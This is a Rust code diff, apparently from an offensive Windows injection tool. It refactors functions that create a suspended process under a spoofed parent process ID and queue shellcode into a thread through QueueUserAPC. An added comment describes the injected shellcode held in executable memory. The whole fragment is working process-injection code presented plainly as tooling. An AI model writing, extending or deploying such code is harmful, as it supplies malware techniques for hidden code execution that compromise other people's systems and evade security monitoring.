@@ -135,14 +135,10 @@ fn create_suspended_process_with_ppid(
         InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size);
 
         let mut attr_list: Vec<u8> = vec![0u8; attr_size];
-        let attr_list_ptr = attr_list.as_mut_ptr() as *mut winapi::um::processthreadsapi::LPPROC_THREAD_ATTRIBUTE_LIST;
+        let attr_list_ptr = attr_list.as_mut_ptr()
+            as *mut winapi::um::processthreadsapi::LPPROC_THREAD_ATTRIBUTE_LIST;
 
-        if InitializeProcThreadAttributeList(
-            attr_list_ptr as *mut _,
-            1,
-            0,
-            &mut attr_size,
-        ) == FALSE
+        if InitializeProcThreadAttributeList(attr_list_ptr as *mut _, 1, 0, &mut attr_size) == FALSE
         {
             CloseHandle(parent_handle);
             return Err("Failed to initialize attribute list".to_string());
@@ -217,11 +213,12 @@ fn queue_user_apc(
     use winapi::um::processthreadsapi::QueueUserAPC;
 
     unsafe {
-        let result = QueueUserAPC(
-            Some(std::mem::transmute(shellcode_addr)),
-            thread_handle as *mut _,
-            0,
-        );
+        // SAFETY: shellcode_addr points to executable memory containing valid shellcode
+        // that was allocated and written by our injection code. The memory has been
+        // marked as PAGE_EXECUTE_READ. The APC callback signature matches PAPCFUNC
+        // which expects a ULONG_PTR parameter (we pass 0).
+        let apc_func: winapi::um::winnt::PAPCFUNC = std::mem::transmute(shellcode_addr);
+        let result = QueueUserAPC(apc_func, thread_handle as *mut _, 0);
 
         if result == FALSE as u32 {
             return Err("Failed to queue APC".to_string());
